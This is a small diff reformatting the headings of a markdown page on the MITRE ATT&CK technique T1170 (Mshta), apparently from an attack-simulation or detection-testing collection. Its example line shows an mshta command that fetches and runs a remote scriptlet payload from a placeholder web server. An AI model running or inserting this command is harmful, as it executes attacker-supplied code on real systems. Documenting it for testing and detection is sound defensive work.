@@ -1,8 +1,9 @@
-## Mshta
+# Mshta
 
-MITRE ATT&CK Technique: [T1170](https://attack.mitre.org/wiki/Technique/T1170)
+## MITRE ATT&CK Technique:
+[T1170](https://attack.mitre.org/wiki/Technique/T1170)
 
-### Example Execution:
+## Example Execution:
 
     mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
 
